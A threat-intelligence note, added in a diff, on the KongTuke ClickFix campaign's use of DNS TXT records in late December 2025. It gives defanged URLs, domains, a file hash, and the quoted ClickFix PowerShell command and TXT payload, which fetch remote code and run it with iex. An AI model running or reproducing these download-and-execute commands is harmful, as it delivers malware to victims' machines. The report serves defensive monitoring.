@@ -1,0 +1,57 @@
+2026-02-03 (TUESDAY): KONGTUKE CLICKFIX ACTIVITY
+
+AUTHOR:
+
+- Veronica Senderovych
+
+SUPPORTING REFERENCES:
+
+- https://infosec.exchange/@monitorsg/115769263488208547
+- https://infosec.exchange/@monitorsg/115775992893110037
+
+NOTES:
+
+- ClickFix-based campaigns have rotated through different types of commands for clipboard-injected text.
+- In late December 2025, we saw the KongTuke campaign use DNS TXT records in its ClickFix text.
+- These campaigns cycle through various ClickFix techniques, like using the finger protocol or mshta.
+- We will continue to monitor ClickFix campaigns for any further use of DNS TXT records.
+
+INDICATORS FROM KONGTUKE CLICKFIX ACTIVITY USING DNS TXT RECORDS IN LATE DECEMBER 2025:
+
+EXAMPLES OF KONGTUKE URLS FOR CLICKFIX ACTIVITY:
+
+- hxxps[:]//emierich[.]com/2p2o.js
+- hxxps[:]//emierich[.]com/js.php
+
+- hxxps[:]//aacobson[.]com/3w3w.js
+- hxxps[:]//aacobson[.]com/js.php
+
+EXAMPLES OF DOMAINS HOSTING DNS TXT RECORD:
+
+- payload.bruemald[.]top
+- morasota[.]top 
+
+DOMAIN FROM DNS TEXT RECORD THAT HOSTS MALICIOUS POWERSHELL SCRIPT:
+
+- hermisron[.]com
+
+DOMAIN CALLED BY POWERSHELL SCRIPT RETURNED FROM HERMISRON[.]COM:
+
+- app.frugesta[.]top
+
+EXAMPLE OF CLICKFIX TEXT:
+
+"C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -ep bypass -c 
+"iex((Resolve-DnsName -Type TXT payload.bruemald[.]top -Server 8.8.8[.]8).Strings -join ")"
+
+DNS TXT RECORD RETURNED FROM THE CLICKFIX COMMAND:
+
+irm 'hxxps[:]//hermisron[.]com/agent?token=c98348aa5479df05dae407a4c8771f66ff1f8f0708357037'|iex
+
+POWERSHELL SCRIPT RETURNED FROM URL IN THE DNS TXT RECORD:
+
+- SHA-256: a82dd54090493c5efa75c9219b2f0749648741bb09b6a0e3a12c3f9d134fea53
+- File size: 16,790 bytes
+- File location: hxxps[:]//hermisron[.]com/agent?token=c98348aa5479df05dae407a4c8771f66ff1f8f0708357037
+- File type: ASCII text, with very long lines (354)
+= File description: PowerShell script
